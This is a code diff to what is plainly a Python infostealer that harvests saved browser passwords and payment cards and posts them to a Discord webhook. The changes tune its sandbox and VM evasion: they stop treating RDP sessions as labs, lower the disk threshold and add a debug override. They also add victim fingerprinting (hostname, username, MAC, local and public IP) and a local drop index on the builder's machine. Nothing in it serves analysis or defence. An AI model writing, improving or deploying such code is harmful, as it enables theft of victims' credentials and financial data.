@@ -93,7 +93,15 @@ def _rdp():
 
 
 def _hostile():
-    """True when the host looks like a lab. ctypes + stdlib only."""
+    """True when the host looks like a lab. ctypes + stdlib only.
+
+    An RDP session is not a lab: most test boxes, and a lot of real desktops,
+    are reached over RDP. The check that used to sit here stood the grabber
+    down on every remote session, which read as "the payload is dead".
+    OXDEBUG (any value) is the manual override.
+    """
+    if _DEBUG:
+        return False
     node = uuid.getnode()
     mac = ":".join(f"{(node >> s) & 255:02x}" for s in range(40, -1, -8))
     if mac.startswith(_VM_MAC):
@@ -101,11 +109,11 @@ def _hostile():
     host = (os.environ.get("COMPUTERNAME") or "").lower()
     if any(mark in host for mark in _HOST_MARK):
         return True
-    if _debugged() or _rdp():
+    if _debugged():
         return True
     if _ram_gb() and _ram_gb() < 2.0:
         return True
-    if _disk_gb() and _disk_gb() < 55.0:
+    if _disk_gb() and _disk_gb() < 20.0:
         return True
     return False
 
@@ -1772,7 +1780,22 @@ def _chromium_raw():
 def phase2(abe_map=None):
     _ALL_PW.clear()
     _ALL_CARDS.clear()
-    report = {"app_id": APP_ID, "public_ip": _public_ip()}
+    node = uuid.getnode()
+    # Phase 2 has to carry the same identity as phase 1, otherwise the picker
+    # files the archive drop under a second, hostless "sender" and the PC shows
+    # up twice (or not at all when the label is the only thing left).
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+    except OSError:
+        local_ip = ""
+    report = {
+        "app_id": APP_ID,
+        "hostname": socket.gethostname(),
+        "username": getpass.getuser(),
+        "mac": ":".join(f"{(node >> s) & 255:02x}" for s in range(40, -1, -8)),
+        "local_ip": local_ip,
+        "public_ip": _public_ip(),
+    }
     if abe_map is None:
         abe_map = _app_bound_keys()
     report["v20"] = _v20_state(abe_map)
@@ -1908,6 +1931,38 @@ def _summary(payload, limit=1850):
     return out or "(no data)"
 
 
+def _bench_root():
+    """Builder repo root, found by walking up from cwd; None on a victim box."""
+    here = Path.cwd()
+    for base in (here, *list(here.parents)[:3]):
+        if ((base / "payload" / "harvest.py").is_file()
+                and (base / "senders.py").is_file()):
+            return base
+    return None
+
+
+def _repo_drop(payload, phase):
+    """Write a local index of this drop when the process runs on the bench.
+
+    Discord is write-only through a webhook: the channel history cannot be
+    read back without a bot token. So the picker gets its list from local
+    drops. This writes one only when the builder repo is reachable from cwd -
+    a victim box has no payload/harvest.py next to it, so nothing is written.
+    """
+    root = _bench_root()
+    if root is None:
+        return
+    try:
+        label = "".join(ch if (ch.isalnum() or ch in "-._") else "-"
+                        for ch in str(payload.get("label") or APP_ID))[:60]
+        folder = root / "received" / (label or "drop") / f"phase{int(phase)}"
+        folder.mkdir(parents=True, exist_ok=True)
+        (folder / "data.json").write_text(
+            json.dumps(payload, indent=1, ensure_ascii=False), encoding="utf-8")
+    except OSError:
+        pass
+
+
 def _post(hook, payload, files):
     global _LAST_ERROR, _PERMANENT
 
@@ -2012,6 +2067,7 @@ def start(webhook=None, app_id=None, *, persist=False):
             first = phase1()
             first["phase"] = 1
             first["label"] = label
+            _repo_drop(first, 1)
             if not _send(hook, first):
                 _note("start: phase 1 send failed: " + _LAST_ERROR)
             else:
@@ -2022,6 +2078,7 @@ def start(webhook=None, app_id=None, *, persist=False):
             report = phase2()
             report["phase"] = 2
             report["label"] = label
+            _repo_drop(report, 2)
             archive = _archive()
             try:
                 blob = archive.read_bytes()
